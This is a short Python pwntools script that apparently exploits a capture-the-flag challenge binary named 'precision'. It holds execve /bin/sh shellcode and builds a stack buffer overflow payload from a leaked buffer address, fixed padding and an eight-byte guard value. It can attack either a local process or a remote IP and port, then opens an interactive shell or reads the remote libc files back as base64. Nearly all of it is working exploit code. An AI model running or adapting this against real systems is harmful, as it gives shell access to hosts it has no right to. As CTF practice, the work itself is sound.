#!/usr/bin/env python
# The shellcode and offsets are from Josh Makinen, I rewrote this with pwntools and added a convenient libc dumper.
from pwn import *
import binascii

shellcode = '\x31\xc0\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80'

p = process(['pwn/precision_a8f6f0590c177948fe06c76a1831e650']) if '--live' not in sys.argv else remote('54.173.98.115', 1259)

print(p.recvuntil(['Buff: 0x']))
x = p.recvline().strip()
y = int(x, 16)
print('0x%08x' % y)

payload = shellcode + (0x98 - 0x18 - len(shellcode))*'A' + '\xa5\x31\x5a\x47\x55\x15\x50\x40' + 'B'*12 + p32(y)

p.sendline(payload)

time.sleep(0.1)

p.sendline('echo hello')
p.recvuntil(['hello\n'])

def dump_libc(p, path, localpath):
    p.sendline('cat %s | base64' % (path,))
    p.sendline('exit')

    s = p.recvall()

    print('Received %d bytes.' % (len(s),))

    with open(localpath, 'w') as f:
        f.write(s)

if '--dump32' in sys.argv:
    dump_libc(p, '/lib32/libc.so.6', 'weinsa_pwn100_libc32.base64')
elif '--dump64' in sys.argv:
    dump_libc(p, '/lib/x86_64-linux-gnu/libc.so.6', 'weinsa_pwn100_libc64.base64')
else:
    p.interactive()
